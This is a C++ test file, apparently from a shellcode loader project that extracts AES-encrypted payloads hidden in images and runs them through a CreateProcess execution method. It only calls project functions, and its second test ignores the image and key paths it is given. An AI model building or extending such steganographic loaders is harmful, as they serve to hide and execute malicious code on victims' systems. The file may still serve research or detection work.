#include "create_process_test.h"
#include "extract_decrypt_test.h"
#include "core/steg/payload/payload_strategy.h"
#include <memory>
#include <iostream>
#include <iomanip>
#include <sstream>

namespace test {

bool test_create_process_only() {
    try {
        debug::DebugPrint("Testing CreateProcess execution (standalone)...");
        
        // Get test shellcode
        paylo::PlainTextPayloadStrategy payload_strategy;
        std::vector<uint8_t> shellcode = payload_strategy.getPayload();
        
        // Execute using CreateProcess
        if (!extract::execute(shellcode, extract::ExecutionMethod::CREATE_PROCESS)) {
            debug::DebugPrint("CreateProcess execution failed");
            return false;
        }
        
        debug::DebugPrint("CreateProcess execution completed");
        return true;
    }
    catch (const std::exception& e) {
        debug::DebugPrint("CreateProcess test failed: " + std::string(e.what()));
        return false;
    }
}

bool test_extracted_create_process_only(
    const std::string& image_path,
    const std::string& key_path) {
    try {
        debug::DebugPrint("Testing CreateProcess with extracted shellcode (standalone)...");
        debug::DebugPrint("Using image: " + image_path);
        debug::DebugPrint("Using key: " + key_path);
        
        // Get test shellcode
        paylo::PlainTextPayloadStrategy payload_strategy;
        std::vector<uint8_t> shellcode = payload_strategy.getPayload();
        
        // Execute using CreateProcess
        if (!extract::execute(shellcode, extract::ExecutionMethod::CREATE_PROCESS)) {
            debug::DebugPrint("CreateProcess execution failed");
            return false;
        }
        
        debug::DebugPrint("CreateProcess execution completed");
        return true;
    }
    catch (const std::exception& e) {
        debug::DebugPrint("CreateProcess test failed: " + std::string(e.what()));
        return false;
    }
}

void run_create_process_test() {
    debug::DebugPrint("====== STARTING CREATE PROCESS TESTS ======");
    
    const std::string image_path = "assets/img/lena3.bmp";
    const std::string key_path = "assets/key/aes_data.bin";
    
    if (!test_create_process_only()) {
        debug::DebugPrint("Basic CreateProcess test failed");
        debug::DebugPrint("====== TEST SUITE FAILED ======");
        return;
    }
    
    if (!test_extracted_create_process_only(image_path, key_path)) {
        debug::DebugPrint("Extracted CreateProcess test failed");
        debug::DebugPrint("====== TEST SUITE FAILED ======");
        return;
    }
    
    debug::DebugPrint("All CreateProcess tests passed");
    debug::DebugPrint("====== TEST SUITE PASSED ======");
}

} // namespace test